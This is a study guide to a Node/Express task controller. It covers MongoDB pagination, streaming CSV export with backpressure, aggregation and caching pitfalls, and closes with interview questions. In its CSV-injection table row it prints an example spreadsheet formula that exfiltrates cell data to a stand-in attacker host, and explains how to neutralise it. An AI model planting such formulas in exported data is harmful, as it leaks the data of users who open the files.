# `server/controllers/taskController.js`

> The densest file in the project. Carries four heavily-asked topics: pagination strategy, caching with invalidation, streaming responses, and the aggregation pipeline.

**Lines:** 691 · **Concept blocks:** 19

## Handlers

| Handler | Route | Demonstrates |
|---|---|---|
| `listTasks` | `GET /tasks` | **Offset vs cursor pagination**, cache-aside, projection, `.lean()` |
| `getTask` | `GET /tasks/:id` | Uses `req.resource` — no re-query |
| `createTask` | `POST /tasks` | Owner from token, cache invalidation, event emit |
| `updateTask` | `PATCH /tasks/:id` | PATCH vs PUT, `.save()` so hooks fire |
| `deleteTask` | `DELETE /tasks/:id` | Hard vs soft delete, 204 |
| `getTaskStats` | `GET /tasks/stats` | **Aggregation pipeline + `$facet`** |
| `exportTasksCsv` | `GET /tasks/export` | **Streams + backpressure + CSV injection** |
| `uploadAttachment` | `POST /tasks/:id/attachment` | Multer result handling |
| `getActivity` | `GET /tasks/activity` | Reads the EventEmitter ring buffer |

---

## ⭐ Offset vs cursor pagination

Both are implemented on the same endpoint; `?mode=cursor` toggles.

### Offset (`skip`/`limit`)

```js
Task.find(filter).skip((page - 1) * limit).limit(limit)
```

✅ Jump to any page · "Page 7 of 240" · trivial to implement

❌ Three real problems:

| Problem | Detail |
|---|---|
| **Linearly slower with depth** | `skip(10000)` does **not** teleport — MongoDB **walks and discards** the first 10,000 documents. Page 1 reads 20; page 500 reads 10,020 and throws away 10,000. **O(offset + limit).** Your p99 is set by whoever browses furthest. This is why "the last page of our admin table times out". |
| **Skips and duplicates rows** | Reading page 2 (rows 21–40) while someone inserts at the top: everything shifts, so the row that *was* #20 (already shown) is now #21 and **appears twice**. A deletion does the mirror image — a row shifts up into page 1's range after you passed it and you **never see it**. |
| **Counting is its own cost** | "Page 7 of 240" needs `countDocuments()`, a second scan of the matching set. Often more expensive than the page query itself. |

### Cursor / keyset ("seek method")

```js
Task.find({ ...filter, _id: { $lt: lastSeenId } }).sort({ _id: -1 }).limit(limit)
```

Instead of "skip 10,000 rows", it says "start **after** this specific row".

✅ **Constant time at any depth** — O(log n) seek + O(limit) read. Page 50,000 is as fast as page 1.
✅ **Stable** under concurrent inserts/deletes — nothing shifts your window.

❌ No random access (no page numbers) · the cursor field must be **unique and indexed**

⚠️ **Ties:** sort by `createdAt` with 50 tasks sharing a timestamp and the cursor lands mid-tie, **silently dropping rows**. Fix with a compound cursor comparing as a tuple:

```js
{ $or: [ { createdAt: { $lt: c } },
         { createdAt: c, _id: { $lt: id } } ] }
```

`_id` alone works precisely *because* it's unique.

**Verdict:** offset for admin tables where users expect page numbers; cursor for feeds, infinite scroll, public APIs. Every large-scale API you've used (Twitter, Stripe, Slack, GitHub) exposes cursors — not a coincidence.

**Implementation note:** cursor mode fetches `limit + 1` rows; the extra row's existence signals `hasMore` without a second count query.

---

## ⭐ Streams and backpressure (`exportTasksCsv`)

### The naive version

```js
const tasks = await Task.find({ owner });       // ALL of them
let csv = 'title,status\n';
for (const t of tasks) csv += `${t.title},${t.status}\n`;
res.send(csv);
```

Fine at 1,000 rows. At 500,000:

- Every document in memory at once — 500k × ~1KB = 500MB, multiplied again by Mongoose hydration
- Repeated string concat allocates; the final CSV is another full copy
- V8's ~1.5GB heap limit is hit → **process dies**, taking every other in-flight request
- The user sees nothing for 30 seconds, then a timeout
- Building the string is synchronous CPU work that **blocks the event loop**

### The streaming version

One document is read from the cursor, converted to a CSV line, written to the response, and released — **memory stays flat** whether it's 100 rows or 10 million, and the browser starts downloading immediately.

### ⭐ Backpressure — the part that separates real understanding

Producers and consumers run at different speeds. MongoDB on a local SSD produces rows far faster than a user on hotel wifi receives them. Ignore that and unsent data piles up **in your process's memory** — you've reinvented the OOM crash, just slower and only for slow clients, so it passes every local test.

**The mechanism:** `stream.write()` **returns a boolean**. `false` means "my buffer exceeded `highWaterMark` — stop". The producer must pause and wait for `'drain'`. That feedback loop *is* backpressure.

`pipeline()` handles this for you. That's the real answer to "why not just call `write()` in a for-loop?"

### `pipeline()` vs `pipe()`

⭐ **Always `pipeline()`.** Plain `.pipe()` does **not** forward errors and does **not** clean up the source if the destination fails — a client disconnecting mid-download leaves your Mongo cursor open, **leaking a connection every time**. `pipeline()` destroys every stream in the chain.

### Other details in this handler

| Detail | Why |
|---|---|
| Headers set **before** any write | Once the first byte is on the wire, headers are immutable — you **cannot** change a 200 to a 500. Hence the `res.headersSent` branch in [`errorHandler`](../middleware/errorHandler.js.md). |
| `.cursor({ batchSize: 500 })` | `.find()` buffers the entire result set; `.cursor()` streams in batches |
| `Transform` with `objectMode` | The `callback` gates the next chunk — **that's how backpressure propagates upstream** |
| **CSV injection** | A title starting with `=`, `+`, `-` or `@` is treated as a **formula** by Excel/Sheets. `=HYPERLINK("http://evil.com?d="&A1,"Click")` exfiltrates other cells. **Your app is fine; your user's machine is the target.** Prefixed with `'` to neutralise. |
| Client disconnect ≠ error | `ERR_STREAM_PREMATURE_CLOSE`/`EPIPE` is normal. Logging it at error level fills dashboards with noise. |

---

## ⭐ Aggregation (`getTaskStats`)

The key insight: **the work happens on the database server.** The alternative — pulling 50,000 documents over the network and reducing them in JavaScript — transfers megabytes, allocates them all, and blocks the event loop. ([`queryDemoController`](./queryDemoController.js.md) does exactly that, on purpose, so you can measure it.)

**Stages to know:** `$match` (WHERE) · `$group` (GROUP BY) · `$project` (SELECT) · `$sort` · `$limit`/`$skip` · `$lookup` (LEFT JOIN) · `$unwind` · `$facet`

⭐ **`$match` and `$limit` as early as possible.** Only a `$match` in the **first stage** can use an index. Once any stage has transformed the documents, the planner has nothing to work with. `$match` after `$group` is the classic aggregation performance bug.

⚠️ **Each stage is capped at 100MB.** Exceed it and the aggregation **fails** unless `allowDiskUse: true` (much slower). Another reason `$match`-first matters.

**`$facet`** runs several sub-pipelines over **one pass** of the matched documents — status counts, priority counts, overdue count, totals and top tags from a *single* query instead of five. It's also the standard trick for "give me the page AND the total in one round-trip". ⚠️ Each facet's output is one document, so it's subject to the 16MB limit — use it for aggregates, not large result sets.

---

## Other concepts

| Concept | Takeaway |
|---|---|
| **`.select()` projection** | Without it, MongoDB reads and returns **every** field including the 2KB description — over 20 rows that's 40KB of disk read, BSON decode, transfer and serialisation nobody asked for. The deeper win is a **covered query**: if every selected field is in the index, documents are never touched (`totalDocsExamined: 0`). |
| **`.lean()`** | Skips Mongoose Document hydration (getters, setters, virtuals, change tracking) — commonly **3–5× faster** on large result sets. ⚠️ Lean docs have no `.save()`, no virtuals, **no `toJSON` transform** — note the visible consequence: the client receives `_id` instead of `id`. |
| **`countDocuments` vs `estimatedDocumentCount`** | `countDocuments` honours your filter but scans — O(n) in matches. `estimatedDocumentCount` reads metadata, O(1), but **takes no filter** and can be slightly stale. |
| **Count and page in parallel** | Offset pagination needs two independent queries. `Promise.all` makes the endpoint as slow as the slower one, not the sum. |
| **Cache key design** | ⚠️ The key must encode **every** input that changes the result. Miss one and you serve user A's tasks to user B — **a data breach, not a caching bug.** Over-broad cache keys are a security issue. |
| **`$regex` search is a trap** | An unanchored regex (`/foo/`) **cannot use a B-tree index** — the index is sorted by prefix and "contains" has no prefix to seek to. So it's a COLLSCAN on every keystroke. Only `/^foo/` can use an index. Plus **ReDoS**: unescaped user input lets an attacker pin your single thread at 100% CPU. |
| **PATCH vs PUT** | PUT is a full **replace** (omitted fields should be cleared); PATCH is **partial**. Most "PUT" endpoints in the wild are really PATCH, which is a real bug when a client omits a field expecting it to be left alone and it gets wiped. |
| **Hard vs soft delete** | Soft delete gives undo and audit trail, but **every query must remember the filter** (one forgotten `deletedAt: null` and deleted data reappears), unique indexes conflict with "deleted" rows, and the table grows forever. ⚠️ A soft delete does **not** satisfy a GDPR erasure request. |

## Interview questions

- **"Paginate a million rows."** → Both strategies, the O(offset) cost, and the skip/duplicate instability.
- **"Export 500k rows to CSV."** → Stream it. Then explain backpressure and why `pipeline()` over `pipe()`.
- **"What is backpressure?"** → `write()` returns false; the producer pauses until `'drain'`.
- **"Why is my aggregation slow?"** → `$match` isn't first, so no index is used. Check the 100MB stage limit too.
- **"What does `.lean()` cost you?"** → Virtuals, `toJSON`, and `.save()`.
- **"A user creates a task and doesn't see it."** → Stale cache. TTL isn't enough; invalidate on write.
- **"Why is your search endpoint slow?"** → Unanchored regex can't use an index.

## Related

- [`models/Task.js`](../models/Task.js.md) — the indexes these queries rely on
- [`utils/cache.js`](../utils/cache.js.md) — cache-aside and invalidation
- [`queryDemoController.js`](./queryDemoController.js.md) — the same ideas, measured
- [`middleware/upload.js`](../middleware/upload.js.md) — the multer side of attachments
- [`tests/integration.tasks.test.js`](../tests/integration.tasks.test.js.md) — pagination stability and CSV-injection tests
